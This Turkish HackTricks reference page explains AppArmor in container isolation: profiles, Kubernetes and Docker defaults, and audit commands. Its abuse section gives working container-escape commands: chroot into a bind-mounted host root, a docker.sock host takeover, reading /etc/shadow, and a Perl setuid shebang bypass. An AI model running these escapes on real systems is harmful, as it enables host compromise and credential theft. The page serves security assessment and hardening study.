# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Container Isolation'daki Rolü

AppArmor, program başına tanımlanan profiller aracılığıyla kısıtlamalar uygulayan bir **Mandatory Access Control** sistemidir. Büyük ölçüde kullanıcı ve grup sahipliğine bağlı olan geleneksel DAC kontrollerinin aksine AppArmor, kernel'in doğrudan sürecin kendisine iliştirilmiş bir policy'yi uygulamasına olanak tanır. Container ortamlarında bu önemlidir; çünkü bir workload geleneksel olarak bir eylemi gerçekleştirmeye yetecek ayrıcalıklara sahip olsa bile AppArmor profili ilgili path'e, mount işlemine, network davranışına veya capability kullanımına izin vermediği için eylem reddedilebilir.

En önemli kavramsal nokta, AppArmor'un **path-based** olmasıdır. SELinux'un yaptığı gibi label'lar yerine path kuralları üzerinden filesystem erişimini değerlendirir. Bu durum onu anlaşılır ve güçlü kılar; ancak bind mount'ların ve alternatif path düzenlerinin dikkatle incelenmesi gerektiği anlamına da gelir. Aynı host içeriği farklı bir path üzerinden erişilebilir hâle gelirse policy'nin etkisi operator'un başlangıçta beklediği gibi olmayabilir.

## Container Isolation'daki Rolü

Container security incelemeleri genellikle capabilities ve seccomp kontrollerinde sona erer; ancak AppArmor bu kontrollerden sonra da önemini korur. Gereğinden fazla ayrıcalığa sahip bir container'ı veya operasyonel nedenlerle bir capability daha gerektiren bir workload'u düşünün. AppArmor, obvious abuse path'lerini durduracak şekilde file access, mount davranışı, networking ve execution pattern'lerini hâlâ kısıtlayabilir. Bu nedenle AppArmor'u "uygulamanın çalışmasını sağlamak için" devre dışı bırakmak, yalnızca riskli bir konfigürasyonu aktif olarak exploit edilebilir bir konfigürasyona sessizce dönüştürebilir.

## Lab

AppArmor'un host üzerinde etkin olup olmadığını kontrol etmek için:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Mevcut container sürecinin hangi kullanıcı altında çalıştığını görmek için:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Fark öğreticidir. Normal durumda işlem, runtime tarafından seçilen profile bağlı bir AppArmor context göstermelidir. unconfined durumunda ise bu ek kısıtlama katmanı ortadan kalkar.

Docker'ın uyguladığını düşündüğü şeyi de inceleyebilirsiniz:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Kullanımı

Docker, host bunu desteklediğinde varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor tabanlı sistemlerde AppArmor ile entegre olabilir; ancak SELinux öncelikli dağıtımlarda diğer MAC sistemi genellikle ön plana çıkar. Kubernetes, AppArmor'ı gerçekten destekleyen node'larda workload seviyesinde AppArmor politikasını etkinleştirebilir. LXC ve Ubuntu ailesiyle ilişkili system-container ortamları da AppArmor'ı kapsamlı şekilde kullanır.

Pratik açıdan önemli nokta, AppArmor'ın bir "Docker özelliği" olmamasıdır. AppArmor, çeşitli runtime'ların uygulamayı seçebildiği bir host-kernel özelliğidir. Host bunu desteklemiyorsa veya runtime `unconfined` olarak çalıştırılacak şekilde yapılandırılmışsa, varsayılan koruma gerçekte mevcut değildir.

Kubernetes özelinde modern API `securityContext.appArmorProfile`'dır. Kubernetes `v1.30` sürümünden beri eski beta AppArmor annotation'ları deprecated durumdadır. Desteklenen host'larda `RuntimeDefault` varsayılan profildir; `Localhost` ise node üzerinde önceden yüklenmiş olması gereken bir profile işaret eder. İnceleme sırasında bu önemlidir; çünkü bir manifest AppArmor farkındalığına sahip görünebilir, ancak tamamen node tarafındaki desteğe ve önceden yüklenmiş profillere bağlı olabilir.<sup>[[1]](#references)</sup>

İnce fakat operasyonel açıdan faydalı bir ayrıntı, `appArmorProfile.type: RuntimeDefault` değerini açıkça ayarlamanın alanı yalnızca belirtmemekten daha katı olmasıdır. Alan açıkça ayarlanmışsa ve node AppArmor'ı desteklemiyorsa admission başarısız olmalıdır. Alan atlanırsa workload, AppArmor olmayan bir node üzerinde çalışmaya devam edebilir ve yalnızca bu ek confinement katmanını almayabilir. Bir attacker açısından bu, hem manifesti hem de gerçek node durumunu kontrol etmek için iyi bir nedendir.<sup>[[1]](#references)</sup>

Docker destekli AppArmor host'larında en iyi bilinen varsayılan `docker-default`'tur. Bu profil, Moby'nin AppArmor template'inden oluşturulur ve bazı capability tabanlı PoC'lerin varsayılan bir container içinde neden hâlâ başarısız olduğunu açıklaması açısından önemlidir. Genel olarak `docker-default`, normal networking işlemlerine izin verir, `/proc`'un büyük bölümüne yazmayı engeller, `/sys`'in hassas bölümlerine erişimi reddeder, mount işlemlerini engeller ve ptrace'i genel amaçlı bir host-probing primitive'i olmayacak şekilde kısıtlar. Bu temel davranışı anlamak, "container'da `CAP_SYS_ADMIN` var" ifadesiyle "container bu capability'yi ilgilendiğim kernel interface'lerine karşı gerçekten kullanabiliyor" ifadesini birbirinden ayırmaya yardımcı olur.

## Profil Yönetimi

AppArmor profilleri genellikle `/etc/apparmor.d/` altında saklanır. Yaygın bir adlandırma kuralı, executable path içindeki slash karakterlerini noktalarla değiştirmektir. Örneğin, `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` olarak saklanır. Bu ayrıntı hem defense hem de assessment sırasında önemlidir; çünkü etkin profil adını öğrendikten sonra host üzerindeki ilgili dosyayı çoğu zaman hızlıca bulabilirsiniz.

Host tarafında kullanılabilecek yararlı yönetim komutları şunlardır:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Bir container-security referansında bu komutların önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain mode'a geçirildiğini ve uygulama değişikliklerinden sonra nasıl düzenlendiğini açıklamalarıdır. Bir operator troubleshooting sırasında profilleri complain mode'a geçirme ve enforcement'ı geri yüklemeyi unutma alışkanlığına sahipse container, dokümantasyonda korumalı görünürken gerçekte çok daha gevşek davranabilir.

### Profilleri Oluşturma ve Güncelleme

`aa-genprof`, uygulama davranışını izleyebilir ve etkileşimli olarak bir profil oluşturmaya yardımcı olabilir:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`, daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profil oluşturabilir:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
İkili dosya değiştiğinde ve policy güncellenmesi gerektiğinde, `aa-logprof` loglarda bulunan denial'ları yeniden oynatabilir ve operatöre bunlara izin verip vermeme konusunda yardımcı olabilir:
```bash
sudo aa-logprof
```
### Loglar

AppArmor engellemeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar üzerinden görülebilir:
```bash
sudo aa-notify -s 1 -v
```
Bu, operasyonel ve saldırı amaçlı olarak kullanışlıdır. Savunmacılar profilleri geliştirmek için bunu kullanır. Saldırganlar ise hangi kesin path veya operation'ın reddedildiğini ve bir exploit chain'i engelleyen kontrolün AppArmor olup olmadığını öğrenmek için bunu kullanır.

### Kesin Profil Dosyasını Belirleme

Bir runtime bir container için belirli bir AppArmor profile name gösterdiğinde, bu adı diskteki profile file ile eşleştirmek genellikle yararlıdır:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Bu, özellikle host-side inceleme sırasında kullanışlıdır; çünkü "container, `lowpriv` profili altında çalıştığını söylüyor" ile "gerçek kurallar denetlenebilecek veya yeniden yüklenebilecek bu belirli dosyada bulunuyor" arasındaki boşluğu kapatır.

### Denetlenmesi Gereken High-Signal Kurallar

Bir profili okuyabildiğinizde yalnızca basit `deny` satırlarıyla yetinmeyin. Birkaç kural türü, AppArmor'un bir container escape attempt karşısında ne kadar etkili olacağını önemli ölçüde değiştirir:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: hedef binary'yi unconfined olarak çalıştırır. Erişilebilir bir helper, shell veya interpreter `ux` altında izinliyse, genellikle test edilecek ilk şey budur.
- `px` / `Px` ve `cx` / `Cx`: exec sırasında profile transition gerçekleştirir. Bunlar otomatik olarak kötü değildir, ancak bir transition mevcut profilden çok daha geniş bir profile geçiş yapabileceği için denetlenmeye değerdir.
- `change_profile`: bir task'ın başka bir loaded profile'a hemen veya bir sonraki exec sırasında geçmesine izin verir. Hedef profile daha zayıfsa, bu kısıtlayıcı bir domain'den çıkmak için tasarlanmış escape hatch haline gelebilir.
- `flags=(complain)`, `flags=(unconfined)` veya daha yeni `flags=(prompt)`: bunlar profile ne kadar güvenmeniz gerektiğini değiştirmelidir. `complain`, denial'ları enforce etmek yerine log'lar; `unconfined`, boundary'yi kaldırır; `prompt` ise yalnızca kernel tarafından uygulanan bir deny yerine userspace karar yoluna bağlıdır.
- `userns` veya `userns create,`: daha yeni AppArmor policy, user namespace oluşturulmasını mediate edebilir. Bir container profili buna açıkça izin veriyorsa, platform hardening stratejisinin bir parçası olarak AppArmor kullansa bile nested user namespace'ler hâlâ devrededir.

Host-side grep için kullanışlı komut:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Bu tür bir audit, yüzlerce sıradan file rule'a bakmaktan çoğu zaman daha faydalıdır. Bir breakout işlemi bir helper çalıştırmaya, yeni bir namespace'e girmeye veya daha az kısıtlayıcı bir profile geçmeye bağlıysa yanıt, genellikle bariz `deny /etc/shadow r` tarzı satırlarda değil, bu geçiş odaklı rule'larda gizlidir.

## Misconfigurations

En bariz hata `apparmor=unconfined` kullanmaktır. Administrators bunu genellikle, profile tehlikeli veya beklenmedik bir şeyi doğru şekilde engellediği için başarısız olan bir application'da debugging yaparken ayarlar. Flag production'da kalırsa MAC layer fiilen kaldırılmış olur.

Bir başka ince problem, file permissions normal göründüğü için bind mount'ların zararsız olduğunu varsaymaktır. AppArmor path-based olduğundan, host path'lerini alternatif mount konumları altında açığa çıkarmak path rule'larıyla sorunlu şekilde etkileşime girebilir. Üçüncü bir hata ise, host kernel'i AppArmor'u gerçekten enforce etmiyorsa config file'daki bir profile adının pek bir anlam ifade etmediğini unutmaktır.

## Abuse

AppArmor ortadan kalktığında, daha önce kısıtlanmış olan işlemler birden çalışabilir: bind mount'lar üzerinden hassas path'leri okumak, normalde kullanımının daha zor olması gereken procfs veya sysfs bölümlerine erişmek, capabilities/seccomp de izin veriyorsa mount ile ilgili işlemler gerçekleştirmek veya bir profile'ın normalde deny edeceği path'leri kullanmak. AppArmor genellikle capability tabanlı bir breakout girişiminin kâğıt üzerinde "çalışması gerekirken" pratikte neden başarısız olduğunu açıklayan mekanizmadır. AppArmor'u kaldırın; aynı girişim başarılı olmaya başlayabilir.

AppArmor'un bir path-traversal, bind-mount veya mount tabanlı abuse chain'i durduran ana mekanizma olduğundan şüpheleniyorsanız ilk adım genellikle bir profile ile ve profile olmadan nelerin erişilebilir hâle geldiğini karşılaştırmaktır. Örneğin, bir host path container içine mount edilmişse, öncelikle path boyunca ilerleyip onu okuyabildiğinizi kontrol ederek başlayın:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Konteynerde `CAP_SYS_ADMIN` gibi tehlikeli bir capability de varsa en pratik testlerden biri, mount işlemlerini veya hassas kernel dosya sistemlerine erişimi engelleyen kontrolün AppArmor olup olmadığını belirlemektir:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Bir host path’in bind mount üzerinden zaten kullanılabilir olduğu ortamlarda, AppArmor’un devre dışı kalması read-only bir information-disclosure sorununu doğrudan host dosyası erişimine de dönüştürebilir:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Bu komutların amacı, breakout işlemini tek başına AppArmor'ın gerçekleştirdiğini göstermek değildir. AppArmor kaldırıldıktan sonra birçok filesystem ve mount tabanlı abuse yolunun hemen test edilebilir hâle gelmesidir.

### Full Example: AppArmor Disabled + Host Root Mounted

Container içinde host root zaten `/host` konumuna bind-mounted durumdaysa, AppArmor'ın kaldırılması engellenmiş bir filesystem abuse yolunu eksiksiz bir host escape işlemine dönüştürebilir:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Shell host filesystem üzerinden çalıştırıldığında, workload container sınırını fiilen aşmış olur:
```bash
id
hostname
cat /etc/shadow | head
```
### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Gerçek engel runtime state çevresindeki AppArmor ise, complete escape için mount edilmiş bir socket yeterli olabilir:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kesin yol mount point'e bağlıdır, ancak sonuç aynıdır: AppArmor artık runtime API'ye erişimi engellemez ve runtime API, host'u ele geçirebilecek bir container başlatabilir.

### Full Example: Path-Based Bind-Mount Bypass

AppArmor path-based olduğundan, `/proc/**` koruması aynı host procfs içeriği farklı bir path üzerinden erişilebilir olduğunda bunu otomatik olarak korumaz:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Etki, tam olarak neyin mount edildiğine ve alternatif yolun diğer kontrolleri de bypass edip etmediğine bağlıdır; ancak bu pattern, AppArmor'un yalıtılmış şekilde değil, mount düzeniyle birlikte değerlendirilmesi gerektiğinin en açık nedenlerinden biridir.

### Full Example: Shebang Bypass

AppArmor policy bazen interpreter path'ini, shebang işleme üzerinden script execution'ını tam olarak hesaba katmayacak şekilde hedefler. Geçmişteki bir örnekte, ilk satırı confined bir interpreter'ı işaret eden bir script kullanılıyordu:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Bu tür bir örnek, profil amacının ve gerçek yürütme semantiğinin birbirinden farklı olabileceğini hatırlatması açısından önemlidir. Container ortamlarında AppArmor incelenirken interpreter zincirleri ve alternatif yürütme yollarına özel dikkat gösterilmelidir.

## Kontroller

Bu kontrollerin amacı üç soruyu hızlıca yanıtlamaktır: Host üzerinde AppArmor etkin mi, mevcut process kısıtlanmış mı ve runtime bu container'a gerçekten bir profile uygulamış mı?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Burada ilgi çekici olanlar:

- `/proc/self/attr/current` `unconfined` gösteriyorsa workload, AppArmor confinement'dan yararlanmıyordur.
- `aa-status` AppArmor'ın devre dışı olduğunu veya yüklenmediğini gösteriyorsa runtime config'deki herhangi bir profile name çoğunlukla kozmetiktir.
- `docker inspect` `unconfined` veya beklenmeyen bir custom profile gösteriyorsa bu, çoğu zaman filesystem veya mount tabanlı abuse path'in çalışmasının nedenidir.
- `/sys/kernel/security/apparmor/profiles` beklediğiniz profile'ı içermiyorsa runtime veya orchestrator configuration tek başına yeterli değildir.
- Sözde hardened bir profile `ux`, geniş kapsamlı `change_profile`, `userns` veya `flags=(complain)` tarzı rules içeriyorsa pratik sınır, profile name'in düşündürdüğünden çok daha zayıf olabilir.

Bir container operasyonel nedenlerle zaten elevated privileges'a sahipse AppArmor'ı etkin bırakmak, kontrollü bir istisna ile çok daha geniş kapsamlı bir security failure arasındaki farkı yaratabilir.

## Runtime Defaults

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | AppArmor destekleyen host'larda varsayılan olarak etkin | Üzerinde değişiklik yapılmadığı sürece `docker-default` AppArmor profile'ını kullanır | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host'a bağlıdır | AppArmor, `--security-opt` aracılığıyla desteklenir; ancak kesin varsayılan, host/runtime'a bağlıdır ve Docker'ın belgelenmiş `docker-default` profile'ı kadar evrensel değildir | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | `appArmorProfile.type` belirtilmezse varsayılan `RuntimeDefault` olur; ancak bu yalnızca node üzerinde AppArmor etkinse uygulanır | `securityContext.appArmorProfile.type: Unconfined`, zayıf bir profile sahip `securityContext.appArmorProfile.type: Localhost`, AppArmor desteği olmayan node'lar |
| Kubernetes altında containerd / CRI-O | Node/runtime desteğini takip eder | Kubernetes tarafından desteklenen yaygın runtime'lar AppArmor'ı destekler; ancak gerçek enforcement hâlâ node desteğine ve workload ayarlarına bağlıdır | Kubernetes satırındakiyle aynıdır; doğrudan runtime configuration AppArmor'ı tamamen atlayabilir |

AppArmor için en önemli değişken çoğu zaman yalnızca runtime değil, **host**'tur. Bir manifest içindeki profile ayarı, AppArmor'ın etkin olmadığı bir node üzerinde confinement oluşturmaz.

## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
